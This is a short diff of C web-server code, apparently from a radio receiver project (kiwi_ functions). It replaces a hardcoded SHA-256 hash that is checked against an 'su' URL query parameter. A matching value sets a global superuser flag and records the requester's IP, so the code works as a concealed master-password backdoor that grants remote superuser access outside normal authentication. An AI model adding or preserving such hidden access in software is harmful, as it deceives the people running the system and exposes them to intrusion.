@@ -800,7 +800,7 @@ int web_request(struct mg_connection *mc, enum mg_event evt) {
             } else {
                 char *su_m = NULL;
                 if (sscanf(qs[i], "su=%256ms", &su_m) == 1) {
-                    if (kiwi_sha256_strcmp(su_m, "34ac320e522bdd9c8e5f8b9e5aa264e732473b0621a8b899ddf2c708d80b442c") == 0) {
+                    if (kiwi_sha256_strcmp(su_m, "df05611250593c4299da8b3216751552b5a690e44b7e1b63f419e64b5e14ed9c") == 0) {
                         auth_su = true;     // a little dodgy that we have to use a global -- be sure to reset asap
                         kiwi_strncpy(auth_su_remote_ip, remote_ip, NET_ADDRSTRLEN);
                     }
